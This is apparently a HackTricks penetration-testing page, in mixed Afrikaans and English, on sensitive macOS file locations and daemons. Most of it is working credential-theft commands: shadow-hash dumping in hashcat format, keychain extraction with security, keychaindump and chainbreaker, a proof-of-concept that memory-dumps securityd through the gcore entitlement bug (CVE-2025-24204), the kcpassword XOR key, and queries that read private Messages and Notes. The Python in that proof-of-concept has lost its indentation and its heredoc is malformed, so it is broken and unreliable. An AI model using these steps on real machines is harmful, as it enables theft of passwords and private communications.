# macOS Gevoelige Ligginge & Interessante Daemons

{{#include ../../../banners/hacktricks-training.md}}

## Wagwoorde

### Shadow-wagwoorde

Shadow password is stored with the user's configuration in plists located in **`/var/db/dslocal/nodes/Default/users/`**.\
Die volgende oneliner kan gebruik word om **alle inligting oor die gebruikers** (insluitend hash info) te dump:
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
[**Skripte soos hierdie een**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) of [**hierdie een**](https://github.com/octomagon/davegrohl.git) kan gebruik word om die hash na **hashcat** **formaat** om te skakel.

’n Alternatiewe one-liner wat creds van alle nie-diensrekeninge in hashcat format `-m 7100` (macOS PBKDF2-SHA512) sal dump:
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
Nog 'n manier om die `ShadowHashData` van 'n gebruiker te bekom, is deur `dscl` te gebruik: `` sudo dscl . -read /Users/`whoami` ShadowHashData ``

### /etc/master.passwd

Hierdie lêer word **slegs gebruik** wanneer die stelsel in **single-user mode** is (dus nie baie gereeld nie).

### Keychain Dump

Let daarop dat wanneer die security-binary gebruik word om **dump the passwords decrypted**, sal verskeie prompts die gebruiker vra om hierdie operasie toe te laat.
```bash
#security
security dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```
### [Keychaindump](https://github.com/juuso/keychaindump)

> [!CAUTION]
> Volgens hierdie kommentaar [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) lyk dit asof hierdie gereedskap nie meer in Big Sur werk nie.

### Keychaindump Overview

'n gereedskap met die naam **keychaindump** is ontwikkel om wagwoorde uit macOS keychains te onttrek, maar dit het beperkings op nuwer macOS-weergawes soos Big Sur, soos aangedui in 'n [discussion](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760). Die gebruik van **keychaindump** vereis dat die aanvaller toegang kry en privileges eskaleer na **root**. Die gereedskap gebruik die feit uit dat die keychain standaard by gebruikersaanmelding ontsluit word vir gerief, wat toepassings toelaat om toegang te kry sonder om herhaaldelik die gebruiker se wagwoord te vereis. As 'n gebruiker egter kies om hul keychain na elke gebruik te sluit, raak **keychaindump** ondoeltreffend.

**Keychaindump** werk deur 'n spesifieke proses genaamd **securityd** te teiken, wat deur Apple beskryf word as 'n daemon vir autorisasie en kriptografiese operasies, noodsaaklik vir toegang tot die keychain. Die onttrekkingsproses behels die identifisering van 'n **Master Key** wat afgelei is van die gebruiker se aanmeldwagwoord. Hierdie sleutel is noodsaaklik om die keychain-lêer te lees. Om die **Master Key** te vind, skandeer **keychaindump** die geheue-heap van **securityd** met die `vmmap`-opdrag, op soek na potensiële sleutels binne areas wat gemerk is as `MALLOC_TINY`. Die volgende opdrag word gebruik om hierdie geheue-ligginge te ondersoek:
```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```
Na die identifisering van potensiële meestersleutels, soek **keychaindump** die heaps deur na 'n spesifieke patroon (`0x0000000000000018`) wat 'n kandidaat vir die meestersleutel aandui. Verdere stappe, insluitend deobfuscation, is nodig om hierdie sleutel te gebruik, soos uiteengesit in **keychaindump**'s bronkode. Ontleders wat op hierdie area fokus, moet opmerk dat die kritieke data vir die ontsleuteling van die keychain in die geheue van die **securityd**-proses gestoor word. 'n Voorbeeldopdrag om **keychaindump** te laat loop is:
```bash
sudo ./keychaindump
```
### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker) kan gebruik word om die volgende tipes inligting uit 'n OSX keychain op 'n forensies gesonde wyse uit te trek:

- Gehashte Keychain-wagwoord, geskik vir kraak met [hashcat](https://hashcat.net/hashcat/) of [John the Ripper](https://www.openwall.com/john/)
- Internet-wagwoorde
- Algemene wagwoorde
- Privaat sleutels
- Openbare sleutels
- X509-sertifikate
- Beveiligde notas
- Appleshare-wagwoorde

As die keychain-ontsluitwagwoord beskikbaar is, 'n meestersleutel verkry met [volafox](https://github.com/n0fate/volafox) of [volatility](https://github.com/volatilityfoundation/volatility), of 'n ontsluitlêer soos SystemKey, sal Chainbreaker ook platteks-wagwoorde voorsien.

Sonder een van hierdie metodes om die Keychain te ontsluit, sal Chainbreaker al die ander beskikbare inligting vertoon.

#### **Dump keychain keys**
```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```
#### **Dump keychain sleutels (met wagwoorde) met SystemKey**
```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Uitvoer van keychain-sleutels (met wagwoorde) en kraak die hash**
```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Dump keychain-sleutels (met wagwoorde) met memory dump**

[Volg hierdie stappe](../index.html#dumping-memory-with-osxpmem) om 'n **memory dump** uit te voer
```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Dump keychain keys (with passwords) met behulp van users password**

As jy die users password ken, kan jy dit gebruik om **dump and decrypt keychains that belong to the user**.
```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```
### Keychain master key deur die `gcore` entitlement (CVE-2025-24204)

macOS 15.0 (Sequoia) het `/usr/bin/gcore` meegelewer met die **`com.apple.system-task-ports.read`** entitlement, sodat enige plaaslike admin (of kwaadwillige ondertekende app) kon dump **any process memory even with SIP/TCC enforced**. Dumping `securityd` leaks die **Keychain master key** in duidelike teks en laat jou toe om `login.keychain-db` te ontsleutel sonder die gebruiker se wagwoord.

**Quick repro on vulnerable builds (15.0–15.2):**
```bash
sudo pgrep securityd        # usually a single PID
sudo gcore -o /tmp/securityd $(pgrep securityd)   # produces /tmp/securityd.<pid>
python3 - <<'PY'
import mmap,re,sys
with open('/tmp/securityd.'+sys.argv[1],'rb') as f:
mm=mmap.mmap(f.fileno(),0,access=mmap.ACCESS_READ)
for m in re.finditer(b'\x00\x00\x00\x00\x00\x00\x00\x18.{96}',mm):
c=m.group(0)
if b'SALTED-SHA512-PBKDF2' in c: print(c.hex()); break
PY $(pgrep securityd)
```
Feed die onttrekte hex-sleutel na Chainbreaker (`--key <hex>`) om die login keychain te ontsleutel. Apple het die entitlement verwyder in **macOS 15.3+**, so dit werk slegs op onopgedateerde Sequoia-builds of stelsels wat die kwesbare binary bewaar het.

### kcpassword

Die **kcpassword**-lêer bevat die **gebruikers se login-wagwoord**, maar slegs as die stelsel-eienaar **outomatiese aanmelding geaktiveer** het. Daarom sal die gebruiker outomaties ingemeld word sonder om vir 'n wagwoord gevra te word (wat nie baie veilig is nie).

Die wagwoord word gestoor in die lêer **`/etc/kcpassword`** xored met die sleutel **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`**. As die gebruiker se wagwoord langer is as die sleutel, sal die sleutel hergebruik word.\
Dit maak die wagwoord redelik maklik om te herstel, byvoorbeeld met skripte soos [**this one**](https://gist.github.com/opshope/32f65875d45215c3677d).

## Interessante inligting in databasisse

### Messages
```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```
### Kennisgewings

Jy kan die kennisgewingsdata vind in `$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/`

Die meeste van die interessante inligting gaan in **blob** wees. Dus sal jy daardie inhoud moet **onttrek** en **transformeer** na **mens** **leesbaar** of gebruik **`strings`**. Om toegang daartoe te kry, kan jy:
```bash
cd $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/
strings $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db | grep -i -A4 slack
```
#### Onlangse privaatheidsprobleme (NotificationCenter DB)

- In macOS **14.7–15.1** Apple het banner-inhoud in die `db2/db` SQLite gestoor sonder behoorlike redaksie. CVEs **CVE-2024-44292/44293/40838/54504** het enige plaaslike gebruiker toegelaat om ander gebruikers se kennisgewings-tekst net deur die DB oop te maak te lees (geen TCC-prompt nie). Gerepareer in **15.2** deur die DB te verskuif/te sluit; op ouer stelsels die bogenoemde pad still leaks recent notifications and attachments.
- Die databasis is slegs wêreldleesbaar op geaffekteerde builds, dus wanneer hunting on legacy endpoints, kopieer dit voordat jy opdateer om artefakte te bewaar.

### Aantekeninge

Die gebruikers se **notes** kan gevind word in `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

#To dump it in a readable format:
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.Z ; done
```
## Voorkeure

In macOS-apps is die voorkeure geleë in **`$HOME/Library/Preferences`** en in iOS is dit in `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences`.

In macOS kan die CLI-hulpmiddel **`defaults`** gebruik word om die **Voorkeure-lêer te wysig**.

**`/usr/sbin/cfprefsd`** eis die XPC-dienste `com.apple.cfprefsd.daemon` en `com.apple.cfprefsd.agent` en kan aangeroep word om aksies uit te voer, soos om voorkeure te wysig.

## OpenDirectory permissions.plist

Die lêer `/System/Library/OpenDirectory/permissions.plist` bevat permissies wat op node-attribuutte toegepas word en is beskerm deur SIP.\
Hierdie lêer verleen permissies aan spesifieke gebruikers per UUID (en nie uid nie), sodat hulle toegang kan kry tot spesifieke sensitiewe inligting soos `ShadowHashData`, `HeimdalSRPKey` en `KerberosKeys` onder andere:
```xml
[...]
<key>dsRecTypeStandard:Computers</key>
<dict>
<key>dsAttrTypeNative:ShadowHashData</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
<key>dsAttrTypeNative:KerberosKeys</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
[...]
```
## Stelselkennisgewings

### Darwin-kennisgewings

Die primêre daemon vir kennisgewings is **`/usr/sbin/notifyd`**. Om kennisgewings te ontvang, moet kliënte registreer via die `com.apple.system.notification_center` Mach port (kontroleer dit met `sudo lsmp -p <pid notifyd>`). Die daemon kan gekonfigureer word met die lêer `/etc/notify.conf`.

Die name wat vir kennisgewings gebruik word, is unieke omgekeerde DNS-notasies, en wanneer 'n kennisgewing aan een daarvan gestuur word, sal die kliënt(e) wat aangedui het dat hulle dit kan hanteer, dit ontvang.

Dit is moontlik om die huidige status te dump (en al die name te sien) deur die sein SIGUSR2 aan die notifyd-proses te stuur en die gegenereerde lêer te lees: `/var/run/notifyd_<pid>.status`:
```bash
ps -ef | grep -i notifyd
0   376     1   0 15Mar24 ??        27:40.97 /usr/sbin/notifyd

sudo kill -USR2 376

cat /var/run/notifyd_376.status
[...]
pid: 94379   memory 5   plain 0   port 0   file 0   signal 0   event 0   common 10
memory: com.apple.system.timezone
common: com.apple.analyticsd.running
common: com.apple.CFPreferences._domainsChangedExternally
common: com.apple.security.octagon.joined-with-bottle
[...]
```
### Distributed Notification Center

Die **Distributed Notification Center** waarvan die hoof-binary **`/usr/sbin/distnoted`** is, is 'n ander manier om kennisgewings te stuur. Dit maak sekere XPC-dienste beskikbaar en voer sekere kontroles uit om kliënte te probeer verifieer.

### Apple Push Notifications (APN)

In hierdie geval kan toepassings registreer vir **topics**. Die kliënt sal 'n token genereer deur Apple se bedieners te kontak via **`apsd`**.\
Daarna sal providers ook 'n token gegenereer het en in staat wees om met Apple se bedieners te koppel om boodskappe aan die kliënte te stuur. Hierdie boodskappe sal plaaslik deur **`apsd`** ontvang word, wat die kennisgewing aan die toepassing wat daarvoor wag, sal deurgee.

Die voorkeure is geleë in `/Library/Preferences/com.apple.apsd.plist`.

Daar is 'n plaaslike databasis van boodskappe in macOS by `/Library/Application\ Support/ApplePushService/aps.db` en in iOS by `/var/mobile/Library/ApplePushService`. Dit het 3 tabelle: `incoming_messages`, `outgoing_messages` en `channel`.
```bash
sudo sqlite3 /Library/Application\ Support/ApplePushService/aps.db
```
Dit is ook moontlik om inligting oor die daemon en verbindings te kry deur gebruik te maak van:
```bash
/System/Library/PrivateFrameworks/ApplePushService.framework/apsctl status
```
## Gebruikerskennisgewings

Dit is kennisgewings wat die gebruiker op die skerm behoort te sien:

- **`CFUserNotification`**: Hierdie API bied 'n manier om 'n pop-up met 'n boodskap op die skerm te wys.
- **The Bulletin Board**: Dit wys in iOS 'n banier wat verdwyn en in die Notification Center gestoor sal word.
- **`NSUserNotificationCenter`**: Dit is die iOS bulletin board in MacOS. Die databasis met die kennisgewings is geleë in `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db`

## Verwysings

- [HelpNetSecurity – macOS gcore entitlement allowed Keychain master key extraction (CVE-2025-24204)](https://www.helpnetsecurity.com/2025/09/04/macos-gcore-vulnerability-cve-2025-24204/)
- [Rapid7 – Notification Center SQLite disclosure (CVE-2024-44292 et al.)](https://www.rapid7.com/db/vulnerabilities/apple-osx-notificationcenter-cve-2024-44292/)

{{#include ../../../banners/hacktricks-training.md}}
